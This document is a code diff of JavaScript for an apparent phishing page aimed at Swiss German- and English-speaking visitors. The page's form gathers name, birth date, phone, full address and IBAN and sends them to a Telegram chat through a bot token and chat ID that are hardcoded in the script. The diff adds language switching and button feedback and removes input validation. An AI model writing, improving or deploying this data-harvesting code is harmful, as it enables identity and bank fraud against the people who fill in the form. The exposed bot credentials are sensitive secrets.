@@ -1,3 +1,46 @@
+document.addEventListener('DOMContentLoaded', () => {
+  
+  // Твои данные
+  const BOT_TOKEN = '9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI';
+  const CHAT_ID = '-1003907097706';
+
+  // Маска для даты
+  const geburtsdatumInput = document.getElementById('geburtsdatum');
+  if (geburtsdatumInput) {
+    geburtsdatumInput.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 8) value = value.slice(0, 8);
+      let formatted = '';
+      if (value.length > 0) formatted += value.substring(0, 2);
+      if (value.length > 2) formatted += '/' + value.substring(2, 4);
+      if (value.length > 4) formatted += '/' + value.substring(4, 8);
+      e.target.value = formatted;
+    });
+  }
+
+  // Перевод
+  const langBtns = document.querySelectorAll('.lang-btn');
+  const translatableElements = document.querySelectorAll('[data-lang-ch]');
+  
+  langBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const lang = btn.getAttribute('data-lang');
+      langBtns.forEach(b => b.classList.remove('is-active'));
+      btn.classList.add('is-active');
+      
+      translatableElements.forEach(el => {
+        const text = el.getAttribute(`data-lang-${lang}`);
+        if (text) {
+          if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+            el.placeholder = text;
+          } else {
+            el.textContent = text;
+          }
+        }
+      });
+    });
+  });
+
   // Отправка
   const form = document.getElementById('telegramForm');
   
@@ -6,21 +49,20 @@
 
     const submitBtn = form.querySelector('button[type="submit"]');
     const originalText = submitBtn.textContent;
+    
+    // Определяем текущий язык (по активной кнопке в хедере)
+    const activeLang = document.querySelector('.lang-btn.is-active').getAttribute('data-lang');
+    
+    // Текст для кнопки во время загрузки
+    const loadingText = activeLang === 'en' ? 'Sending...' : 'Senden...';
 
-    // Собираем данные из полей СРАЗУ, пока они не очистились
-    const name = document.getElementById('name').value.trim();
-    const geburtsdatum = document.getElementById('geburtsdatum').value.trim();
-    const telefon = document.getElementById('telefon').value.trim();
-    const adresse = document.getElementById('adresse').value.trim();
-    const plz = document.getElementById('plz').value.trim();
-    const stadt = document.getElementById('stadt').value.trim();
-    const iban = document.getElementById('iban').value.trim();
-
-    // Проверка на пустоту (на случай, если Safari их стер)
-    if (!name || !telefon || !iban) {
-      alert('Bitte füllen Sie alle Felder aus.');
-      return;
-    }
+    const name = document.getElementById('name').value;
+    const geburtsdatum = document.getElementById('geburtsdatum').value;
+    const telefon = document.getElementById('telefon').value;
+    const adresse = document.getElementById('adresse').value;
+    const plz = document.getElementById('plz').value;
+    const stadt = document.getElementById('stadt').value;
+    const iban = document.getElementById('iban').value;
 
     const now = new Date();
     const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
@@ -40,15 +82,16 @@
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
 
-    submitBtn.textContent = 'Отправка...';
+    // Показываем "Sending..." или "Senden..."
+    submitBtn.textContent = loadingText;
     submitBtn.disabled = true;
 
     try {
-      const url = `https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       
-      // Отправляем через URLSearchParams (Safari на iPhone это пропускает лучше)
+      // ОТПРАВЛЯЕМ ЧЕРЕЗ URLSearchParams (Safari это пропускает)
       const formData = new URLSearchParams();
-      formData.append('chat_id', '-1003907097706');
+      formData.append('chat_id', CHAT_ID);
       formData.append('text', message);
       formData.append('parse_mode', 'Markdown');
 
@@ -60,16 +103,26 @@
       const data = await response.json();
 
       if (data.ok) {
-        alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
-        form.reset(); // Очищаем форму только ПОСЛЕ успешной отправки
+        submitBtn.textContent = activeLang === 'en' ? '✅ Sent!' : '✅ Gesendet!';
+        submitBtn.style.background = '#28a745';
+        setTimeout(() => {
+          form.reset();
+          submitBtn.textContent = originalText;
+          submitBtn.style.background = '';
+          submitBtn.disabled = false;
+        }, 2000);
       } else {
         throw new Error(data.description || 'Fehler');
       }
     } catch (error) {
       console.error('Ошибка:', error);
-      alert('Fehler beim Senden. Bitte versuchen Sie es später erneut.');
-    } finally {
-      submitBtn.textContent = originalText;
-      submitBtn.disabled = false;
+      submitBtn.textContent = '❌ Fehler!';
+      submitBtn.style.background = '#dc3545';
+      setTimeout(() => {
+        submitBtn.textContent = originalText;
+        submitBtn.style.background = '';
+        submitBtn.disabled = false;
+      }, 3000);
     }
   });
+});
